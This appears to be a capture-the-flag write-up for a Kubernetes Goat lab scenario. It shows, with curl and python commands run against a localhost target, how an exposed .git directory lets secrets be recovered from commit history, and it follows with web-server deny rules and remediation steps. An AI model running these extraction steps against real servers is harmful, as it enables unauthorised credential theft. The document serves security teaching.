# Scenario 1: Sensitive Keys in Codebases

## Challenge Overview

**Difficulty**: Beginner
**Attack Vector**: Exposed `.git` directory, secrets in version control history
**MITRE ATT&CK**: T1552.001 (Credentials In Files), T1213 (Data from Information Repositories)
**OWASP K8s Top 10**: K02 - Supply Chain Vulnerabilities

## Scenario Description

A web application is deployed with its `.git` directory accessible via the web server. While directory listing is disabled, individual git objects can be fetched directly, allowing attackers to reconstruct the repository history and extract sensitive data that was committed.

## Reconnaissance

### Initial Discovery

The target application runs on `http://127.0.0.1:1230/`. Initial testing revealed:

- Static site returning "Cannot GET /path" for invalid routes (Node.js/Express behavior)
- Directory listing disabled (`/.git/` returns "Cannot GET")
- Individual git files are accessible

### Confirming Git Exposure

```bash
curl http://127.0.0.1:1230/.git/config
```

Response:
```
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
```

The `.git` directory contents are accessible despite directory listing being disabled.

## Exploitation

### Step 1: Extract Commit History

```bash
curl http://127.0.0.1:1230/.git/logs/HEAD
```

This revealed the full commit history:

| Commit | Message |
|--------|---------|
| 4dc0726... | Initial commit with README |
| 599f377... | Basic working go server with fiber |
| bb2967a... | Added ping endpoint |
| **d7c173a...** | **Inlcuded custom environmental variables** |
| 94e46d5... | updated the endpoints and routes |
| 3292ff3... | Updated the docs |
| 660b6f3... | Final release |

The commit "Inlcuded custom environmental variables" is suspicious - environment variables often contain secrets.

### Step 2: Examine the Suspicious Commit

Git objects are stored compressed in `.git/objects/[first 2 chars]/[remaining hash]`:

```bash
curl -s http://127.0.0.1:1230/.git/objects/d7/c173ad183c574109cd5c4c648ffe551755b576 \
  | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))"
```

This revealed the tree hash: `73da70026f144ccdfc5b806998b7d58cf37c6f33`

### Step 3: Parse the Tree Object

Extracting the tree object showed files in this commit:

| Mode | Hash | Filename |
|------|------|----------|
| 100644 | b9e2b454e881360b9158698eca3456bea6c2b55b | **.env** |
| 100644 | 9f1f393252fe5527bbfb0708f57ebc05a3550ffc | README.md |
| 100644 | b3c24a996ba5f47473fe8bfa0842ca54def7807e | go.mod |
| 100644 | 00d8b1bebf73f4feff5683d0af858884a1544b99 | go.sum |
| 100644 | 950821141e4626ba376563897fa1780f00aa5aa0 | main.go |

### Step 4: Extract the .env File

```bash
curl -s http://127.0.0.1:1230/.git/objects/b9/e2b454e881360b9158698eca3456bea6c2b55b \
  | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))"
```

**Exposed secrets found:**
- AWS Access Key ID
- AWS Secret Access Key
- Kubernetes Goat flag

## Real-World Impact

This vulnerability pattern is extremely common and has led to major breaches:

1. **Uber (2016)**: AWS credentials exposed in GitHub repo led to data breach of 57 million users
2. **DXC Technology (2017)**: AWS keys in public repos led to cryptomining abuse
3. **Numerous startups**: Exposed cloud credentials regularly discovered by automated scanners

### Attacker Capabilities with Exposed Credentials

- Full access to cloud resources (EC2, S3, IAM)
- Lateral movement within cloud infrastructure
- Data exfiltration
- Cryptomining and resource abuse
- Ransomware deployment

## Mitigations

### Prevention

1. **Block .git access at web server level**
   ```nginx
   # Nginx
   location ~ /\.git {
       deny all;
   }
   ```
   ```apache
   # Apache
   <DirectoryMatch "^/.*/\.git/">
       Require all denied
   </DirectoryMatch>
   ```

2. **Use .gitignore properly**
   ```
   .env
   *.key
   *.pem
   credentials.json
   ```

3. **Pre-commit hooks for secret detection**
   - git-secrets
   - truffleHog
   - detect-secrets

4. **CI/CD secret scanning**
   - GitHub Secret Scanning (built-in)
   - GitLab Secret Detection
   - Gitleaks

### Response (If Secrets Are Exposed)

1. **Immediately rotate all exposed credentials**
2. Review cloud audit logs for unauthorized access
3. Remove secrets from git history using `git filter-branch` or BFG Repo-Cleaner
4. Enable MFA on affected accounts
5. Implement secret management (HashiCorp Vault, AWS Secrets Manager)

## Tools Used

- `curl` - HTTP requests
- `python3` with `zlib` - Decompressing git objects
- Manual git internals analysis

## Key Takeaways

1. **Git remembers everything** - Deleting a file in a later commit doesn't remove it from history
2. **Defense in depth** - Multiple layers needed (web server config, .gitignore, secret scanning)
3. **Assume breach** - Use short-lived credentials and rotate regularly
4. **Automate detection** - Manual review doesn't scale; use automated secret scanning

---

*Completed with assistance from Claude (Anthropic) - AI pair programming for security learning*
